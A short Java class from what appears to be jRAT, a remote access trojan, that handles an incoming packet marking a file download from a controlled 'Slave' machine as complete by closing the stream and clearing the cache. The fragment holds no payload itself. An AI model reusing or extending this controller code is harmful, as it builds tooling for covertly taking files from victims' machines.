package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;
import se.jrat.client.ui.panels.PanelFileTransfer;
import se.jrat.common.io.FileCache;
import se.jrat.common.io.TransferData;


public class Packet31CompleteServerDownload extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		TransferData data = FileCache.get(slave);

		if (data != null) {
			data.getOutputStream().close();
			TransferData dt = FileCache.get(slave);
			FileCache.remove(slave);
		}
	}

}
